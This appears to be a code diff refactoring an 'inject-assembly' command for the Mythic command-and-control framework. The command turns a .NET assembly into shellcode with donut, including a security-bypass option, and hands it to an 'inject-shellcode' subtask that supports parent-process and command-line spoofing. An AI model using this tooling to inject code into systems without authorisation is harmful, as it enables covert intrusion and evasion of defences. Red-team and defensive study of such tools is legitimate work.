@@ -160,52 +160,59 @@ class InjectAssemblyCommand(CommandBase):
             TaskID=taskData.Task.ID,
             Success=True,
         )
-#       Get original file info
+
+        # Retrieve and decode the file
         file_contents = await get_mythic_file(taskData.args.get_arg("file"))
-        decode_file_contents = base64.b64decode(file_contents)
+        decoded_file_contents = base64.b64decode(file_contents)
 
-        #Create a temporary file
-        tempDir = tempfile.TemporaryDirectory()
+        # Create a temporary directory and save the assembly file
+        with tempfile.TemporaryDirectory() as temp_dir:
+            assembly_path = os.path.join(temp_dir, "assembly.exe")
+            with open(assembly_path, "wb") as file:
+                file.write(decoded_file_contents)
 
-        with open(os.path.join(tempDir.name, "assembly.exe"), "wb") as file:
-            file.write(decode_file_contents)
+            # Determine architecture for donut
+            arch_mapping = {"AnyCPU": 3, "x64": 2, "x86": 1}
+            donut_arch = arch_mapping.get(taskData.args.get_arg("arch"), 0)
 
-        donut_arch = 0
-        if taskData.args.get_arg("arch") == "AnyCPU":
-            donut_arch = 3
-        elif taskData.args.get_arg("arch") == "x64":
-            donut_arch = 2
-        elif taskData.args.get_arg("arch") == "x86":
-            donut_arch = 1
+            # Generate shellcode with donut
+            shellcode = donut.create(
+                file=assembly_path,
+                arch=donut_arch,
+                bypass=taskData.args.get_arg("bypass"),
+                params=taskData.args.get_arg("arguments"),
+                exit_opt=taskData.args.get_arg("exit_opt"),
+            )
 
-        shellcode = donut.create(
-            file=os.path.join(tempDir.name, "assembly.exe"),
-            arch = donut_arch,
-            bypass = taskData.args.get_arg("bypass"),
-            params = taskData.args.get_arg("arguments"),
-            exit_opt = taskData.args.get_arg("exit_opt"),
+        # Create Mythic file for the shellcode
+        shellcode_file = await create_mythic_file(
+            taskData.Task.ID, shellcode, "shellcode.bin", delete_after_fetch=True
         )
 
-        shellcodeFile = await create_mythic_file(taskData.Task.ID, shellcode, "shellcode.bin", True)
-        
-        subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
-            taskData.Task.ID, 
-            CommandName="inject-shellcode",
-            SubtaskCallbackFunction="command_callback",
-            Params=json.dumps({
-                "file": shellcodeFile.AgentFileId,
-                "commandline": taskData.args.get_arg("commandline"),
-                "spoofedcommandline": taskData.args.get_arg("spoofedcommandline"),
-                "output": taskData.args.get_arg("output"),
-                "parent": taskData.args.get_arg("parent"),
-            }),
-            Token=taskData.Task.TokenID,
-        ))
+        # Create subtask
+        subtask_params = {
+            "file": shellcode_file.AgentFileId,
+            "commandline": taskData.args.get_arg("commandline"),
+            "spoofedcommandline": taskData.args.get_arg("spoofedcommandline"),
+            "output": taskData.args.get_arg("output"),
+            "parent": taskData.args.get_arg("parent"),
+        }
+        subtask = await SendMythicRPCTaskCreateSubtask(
+            MythicRPCTaskCreateSubtaskMessage(
+                taskData.Task.ID,
+                CommandName="inject-shellcode",
+                SubtaskCallbackFunction="command_callback",
+                Params=json.dumps(subtask_params),
+                Token=taskData.Task.TokenID,
+            )
+        )
 
+        # Handle subtask failure
         if not subtask.Success:
-            raise Exception("Failed to create subtask: " + subtask.Error)
+            raise Exception(f"Failed to create subtask: {subtask.Error}")
 
         return response
+
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
         pass
